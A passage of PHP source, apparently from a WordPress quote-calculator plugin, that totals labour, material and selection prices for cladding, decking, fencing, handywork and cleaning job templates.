									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$current_cladding_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$current_cladding_total = ( $labour_and_material_total ) * $wall_area;
							}
							elseif($current_cladding_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$current_cladding_total = $range_price_total * $wall_area;
							}

					}
			}
			// ADD CURRENT CLADDING TOTAL TO $TOTAL
			$total = $total + $current_cladding_total;

			$proposed_cladding = $data['proposed'];
			$proposed_cladding_total = 0;
			foreach($current_cladding_data as $temp) {
					if( $temp['title'] == $proposed_cladding ) {

							if($proposed_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$proposed_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$proposed_cladding_total = ( $labour_and_material_total ) * $wall_area;
							}
							elseif($proposed_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$proposed_cladding_total = $range_price_total * $wall_area;
							}

					}
			}
			// ADD PROPOSED CLADDING TOTAL TO $TOTAL
			$total = $total + $proposed_cladding_total;

			$paint_ceilings = $data['paint'];
			$paint_ceilings_total = 0;
			if($paint_ceilings == 'Yes') {
					foreach($painted_data as $temp) {
							if($temp['title'] == 'Yes') {

									if($paint_ceilings_prices == 'labour') {
											$labour_price_total = $temp['labour'];
											$labour_price_total_value = 0;
											$material_price_total = $temp['material'];
											$material_price_total_value = 0;
											foreach($labour_price_total as $l) {
													$labour_price_total_value = $labour_price_total_value + $l['price'];
											}
											foreach($material_price_total as $m) {
													$material_price_total_value = $material_price_total_value + $m['price'];
											}
											$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
											// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
											$selectionPrice = 0;
											$selectionPrice = go_calculate_selection($selectionsData,$painted_title,$temp['title']);
											$labour_and_material_total = $labour_and_material_total + $selectionPrice;
											// *** END ***

											$paint_ceilings_total = $labour_and_material_total * $wall_area;
									}
									elseif($paint_ceilings_prices == 'range') {
											$range_price_total = $temp['range_price'];
											$paint_ceilings_total = $range_price_total * $wall_area;
									}

							}
					}

					// ADD PAINT CEILINGS TOTAL TO TOTAL
					$total = $total + $paint_ceilings_total;

			}

			$extra = $data['joinery'];
			$extra_total = 0;
			foreach($windows_and_doors_data as $temp) {
					if( in_array($temp['title'],$extra) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($windows_and_doors_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$windows_and_doors_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
							}
							elseif($windows_and_doors_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extra_total = $extra_total + ( $range_price_total * $extra_count);
							}

					}

			}
			// ADD windows and doors TOTAL TO $TOTAL
			$total = $total + $extra_total;

	}

	// V2 formulas for Decking template
	if(get_the_title($t) == 'Decking') {

			$all_scope_data = get_field('quote_fields',$t);

			$width = $data['area_width'];
			$length = $data['area_length'];


			$floor_area = $width * $length;
			$outer_length = $width + $width + $length + $length;
      $height = $data['height'];
		
			foreach($all_scope_data as $d) {
					if($d['slug'] == 'height') {
							$height_data = $d['fields'];
					}
				  if($d['slug'] == 'shape') {
							$shape_title = $d['title'];
							$shape_prices = $d['type_of_price'];
							$shape_data = $d['fields'];
					}
					if($d['slug'] == 'foundation') {
							$foundation_title = $d['title'];
							$foundation_prices = $d['type_of_price'];
							$foundation_data = $d['fields'];
					}
					if($d['slug'] == 'deck') {
							$decking_title = $d['title'];
							$decking_prices = $d['type_of_price'];
							$decking_data = $d['fields'];
					}
				  if($d['slug'] == 'finish') {
							$finish_title = $d['title'];
							$finish_prices = $d['type_of_price'];
							$finish_data = $d['fields'];
					}
					if($d['slug'] == 'extras') {
							$extra_title = $d['title'];
							$extra_prices = $d['type_of_price'];
							$extra_data = $d['fields'];
					}
			}

      $shape = $data['shape'];
			$shape_total = 0;
			foreach($shape_data as $temp) {
					if( $temp['title'] == $shape ) {

							if($shape_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$shape_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$shape_total = $shape_total + ( $labour_and_material_total * $floor_area );
							}
							elseif($shape_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$shape_total = $range_price_total;
							}

					}
			}

		
			$foundation = $data['foundation'];
			$foundation_total = 0;
			foreach($foundation_data as $temp) {
					if( $temp['title'] == $foundation ) {

							if($foundation_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$foundation_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$foundation_total = $labour_and_material_total;
							}
							elseif($foundation_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$foundation_total = $range_price_total;
							}

					}
			}

			$decking = $data['deck'];
			$decking_total = 0;
			foreach($decking_data as $temp) {
					if( $temp['title'] == $decking ) {

							if($decking_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$decking_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$decking_total = $labour_and_material_total;
							}
							elseif($decking_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$decking_total = $range_price_total;
							}

					}
			}

		  $finish = $data['finish'];
			$finish_total = 0;
			foreach($finish_data as $temp) {
					if( $temp['title'] == $finish ) {

							if($finish_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$finish_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$finish_total = $finish_total + ( $labour_and_material_total * $floor_area );
							}
							elseif($finish_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$finish_total = $range_price_total;
							}

					}
			}

			$extra = $data['extras'];
			$extra_total = 0;
			foreach($extra_data as $temp) {
					if( in_array($temp['title'],$extra) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($extra_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
							}
							elseif($extra_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extra_total = $extra_total + ( $range_price_total * $extra_count);
							}

					}

			}


			$deck_price_sub = $floor_area * ($foundation_total + $decking_total);
		  $foundation_full = $floor_area * $foundation_total;
		  $height_sub = $height * 5;
		  $height_sub_total = $foundation_full * $height_sub / 100;
			$deck_price_sub_percent = $shape_total * $deck_price_sub / 100;
			$decking_total_summ = $deck_price_sub + $deck_price_sub_percent + $extra_total + $finish_total + $height_sub_total;
			$total = $total + $decking_total_summ;

	}

	// V2 formulas for Fencing template
	if(get_the_title($t) == 'Fencing') {

			$all_scope_data = get_field('quote_fields',$t);

			$length = $data['area_length'];
      $height = $data['area_height'];
			foreach($all_scope_data as $d) {
					if($d['slug'] == 'type') {
							$fence_type_title = $d['title'];
							$fence_type_prices = $d['type_of_price'];
							$fence_type_data = $d['fields'];
					}
					if($d['slug'] == 'finish') {
							$finish_title = $d['title'];
							$finish_prices = $d['type_of_price'];
							$finish_data = $d['fields'];
					}
				 if($d['slug'] == 'extras') {
							$extra_title = $d['title'];
							$extra_prices = $d['type_of_price'];
							$extra_data = $d['fields'];
					}
			}

			$area = $length * $height;

			$fence_type = $data['type'];
			$fence_type_total = 0;
			foreach($fence_type_data as $temp) {
					if( $temp['title'] == $fence_type ) {

							if($fence_type_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;

									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = go_calculate_selection($selectionsData,$fence_type_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$fence_type_total = $fence_type_total + ($labour_and_material_total * $area);
							}
							elseif($fence_type_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$fence_type_total = $fence_type_total + ($range_price_total * $area);
							}

					}
			}

		 $finish = $data['finish'];
			$finish_total = 0;
			foreach($finish_data as $temp) {
					if( $temp['title'] == $finish ) {

							if($finish_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;

									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = go_calculate_selection($selectionsData,$finish_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$finish_total = $finish_total + ($labour_and_material_total * $area);
							}
							elseif($finish_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$finish_total = $finish_total + ($range_price_total * $area);
							}

					}
			}

			$extra = $data['extras'];
			$extra_total = 0;
			foreach($extra_data as $temp) {
					if( in_array($temp['title'],$extra) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($extra_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $material_price_total_value + $labour_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
							}
							elseif($extra_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extra_total = $extra_total + ( $range_price_total * $extra_count);
							}

					}

			}

			$fencing_total = $fence_type_total + $finish_total + $extra_total;
			$total = $total + $fencing_total;

	}

  
 // V2 formulas for Painting Exterior template
	if(get_the_title($t) == 'Handywork') {

			$all_scope_data = get_field('quote_fields',$t);
		 
			foreach($all_scope_data as $d) {
				   if($d['slug'] == 'fixtures') {
							$fixtures_title = $d['title'];
							$fixtures_prices = $d['type_of_price'];
							$fixtures_data = $d['fields'];
					}			      		
          if($d['slug'] == 'furniture') {
							$furniture_title = $d['title'];
							$furniture_prices = $d['type_of_price'];
							$furniture_data = $d['fields'];
					}			
					 if($d['slug'] == 'water') {
							$water_title = $d['title'];
							$water_prices = $d['type_of_price'];
							$water_data = $d['fields'];
					}		
					 if($d['slug'] == 'labour') {
							$labour_title = $d['title'];
							$labour_prices = $d['type_of_price'];
							$labour_data = $d['fields'];
					}		
					 if($d['slug'] == 'electrical') {
							$electrical_title = $d['title'];
							$electrical_prices = $d['type_of_price'];
							$electrical_data = $d['fields'];
					}		
      }

     $fixtures = $data['fixtures'];
			$fixtures_total = 0;
			foreach($fixtures_data as $temp) {
					if( ($temp['title'] == $fixtures) || in_array($temp['title'],$fixtures) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($fixtures_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$fixtures_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$fixtures_total = $fixtures_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($fixtures_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$fixtures_total = $fixtures_total + ( $range_price_total * $extra_count );
							}

					}
			}

  $furniture = $data['furniture'];
			$furniture_total = 0;
			foreach($furniture_data as $temp) {
					if( ($temp['title'] == $furniture) || in_array($temp['title'],$furniture) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($furniture_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$furniture_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$furniture_total = $furniture_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($furniture_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$furniture_total = $furniture_total + ( $range_price_total * $extra_count );
							}

					}
			}

       $water = $data['water'];
			$water_total = 0;
			foreach($water_data as $temp) {
					if( ($temp['title'] == $water) || in_array($temp['title'],$water) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($water_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$water_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$water_total = $water_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($water_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$water_total = $water_total + ( $range_price_total * $extra_count );
							}

					}
			}

    $labour = $data['labour'];
			$labour_total = 0;
			foreach($labour_data as $temp) {
					if( ($temp['title'] == $labour) || in_array($temp['title'],$labour) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($labour_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$labour_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$labour_total = $labour_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($labour_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$labour_total = $labour_total + ( $range_price_total * $extra_count );
							}

					}
			}
 
       $electrical = $data['electrical'];
			$electrical_total = 0;
			foreach($electrical_data as $temp) {
					if( ($temp['title'] == $electrical) || in_array($temp['title'],$electrical) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($electrical_prices == 'electrical') {
									$electrical_price_total = $temp['electrical'];
									$electrical_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($electrical_price_total as $l) {
											$electrical_price_total_value = $electrical_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$electrical_and_material_total = $electrical_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$electrical_title,$temp['title']);
									$electrical_and_material_total = $electrical_and_material_total + $selectionPrice;
									// *** END ***

									$electrical_total = $electrical_total + ( $electrical_and_material_total * $extra_count );
							}
							elseif($electrical_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$electrical_total = $electrical_total + ( $range_price_total * $extra_count );
							}

					}
			}

		  
					
      $handy_total = $fixtures_total + $furniture_total + $water_total + $labour_total + $electrical_total;
			$total = $total + $handy_total;

	}

	
 // V2 formulas for Painting Exterior template
	if(get_the_title($t) == 'Cleaning') {

			$all_scope_data = get_field('quote_fields',$t);
		 
			foreach($all_scope_data as $d) {
				   if($d['slug'] == 'carpet') {
							$carpet_title = $d['title'];
							$carpet_prices = $d['type_of_price'];
							$carpet_data = $d['fields'];
					}			      		
				   if($d['slug'] == 'general_clean') {
							$general_clean_title = $d['title'];
							$general_clean_prices = $d['type_of_price'];
							$general_clean_data = $d['fields'];
					}
					if($d['slug'] == 'extras') {
							$extras_title = $d['title'];
							$extras_prices = $d['type_of_price'];
							$extras_data = $d['fields'];
					}
					if($d['slug'] == 'pressure') {
							$pressure_title = $d['title'];
							$pressure_prices = $d['type_of_price'];
							$pressure_data = $d['fields'];
					}
									  if($d['slug'] == 'levels') {
							$levels_title = $d['title'];
							$levels_prices = $d['type_of_price'];
							$levels_data = $d['fields'];
					}

			}


		  
					

			$carpet = $data['carpet'];
			$carpet_total = 0;
			foreach($carpet_data as $temp) {
					if( ($temp['title'] == $carpet) || in_array($temp['title'],$carpet) ) {

												 // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}
												
							if($carpet_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$carpet_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$carpet_total = $carpet_total + $labour_and_material_total;
							}
							elseif($carpet_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$carpet_total = $carpet_total + ( $range_price_total * $extra_count );
							}

					}
			}


			 $general_clean = $data['general_clean'];
			$general_clean_total = 0;
			foreach($general_clean_data as $temp) {
					if( ($temp['title'] == $general_clean) || in_array($temp['title'],$general_clean) ) {

												 // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}
												
							if($general_clean_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$general_clean_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$general_clean_total = $general_clean_total + $labour_and_material_total;
							}
							elseif($general_clean_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$general_clean_total = $general_clean_total + ( $range_price_total * $extra_count );
							}

					}
			}


			$extras = $data['extras'];
			$extras_total = 0;
			foreach($extras_data as $temp) {
					if( ($temp['title'] == $extras) || in_array($temp['title'],$extras) ) {

												 // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							} 
												
							if($extras_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$extras_total = $extras_total + $labour_and_material_total;
							}
							elseif($extras_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$extras_total = $extras_total + ( $range_price_total * $extra_count );
							}

					}
			}


					  $pressure = $data['pressure'];
			$pressure_total = 0;
			foreach($pressure_data as $temp) {
					if( ($temp['title'] == $pressure) || in_array($temp['title'],$pressure) ) {

												  // let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($pressure_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$pressure_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$pressure_total = $pressure_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($pressure_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$pressure_total = $pressure_total + ( $range_price_total * $extra_count );
							}

					}
			}


						$levels = $data['levels'];
			$levels_total = 0;
			foreach($levels_data as $temp) {
					if( $temp['title'] == $levels ) {

							if($levels_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$levels_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$levels_total = $levels_total + $labour_and_material_total;
							}
							elseif($levels_prices == 'range') {
